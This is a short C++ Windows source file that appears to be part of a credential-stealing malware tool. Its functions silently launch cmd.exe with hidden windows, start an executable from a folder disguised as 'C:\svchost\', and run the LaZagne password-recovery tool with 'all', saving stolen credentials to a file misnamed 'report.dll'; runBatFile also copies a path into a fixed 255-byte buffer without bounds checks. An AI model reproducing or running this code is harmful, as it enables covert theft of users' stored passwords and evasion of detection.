#include <windows.h>
#include "FileHandler.h"

BOOL fileExists(LPCTSTR szPath) {
    DWORD dwAttrib = GetFileAttributes(szPath); 
    return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY)); 
}
void runBatFile(std::string pathLocation){
    char commandCall[255]; 
    strcpy(commandCall, "/C ");
    strcat(commandCall, "call \"");
    strcat(commandCall, pathLocation.c_str());
    strcat(commandCall, "\"");
    ShellExecute(0, "open", "cmd.exe", commandCall, 0, SW_HIDE);
}

void runConHost(){
    ShellExecute(0, "open", "cmd.exe",  "/C start /d \"C:\\svchost\\\" conhost.exe\0", "C:\\svchost\\\0", SW_HIDE);
}

void runLazagne(){
    ShellExecute(0, "open", "cmd.exe",  "/C start /b \"C:\\svchost\\\" laZagne.exe all >> report.dll\0", "C:\\svchost\\\0", SW_HIDE);
}

std::string getExecutablePath(){
    char buffer[MAX_PATH];
    GetModuleFileName( NULL, buffer, MAX_PATH );
    std::string::size_type pos = std::string( buffer ).find_last_of( "\\/" );
    return std::string( buffer ).substr( 0, pos);
}

std::string getExecutableFullPath(){
    char buffer[MAX_PATH];
    GetModuleFileName( NULL, buffer, MAX_PATH );
    return std::string( buffer );
}
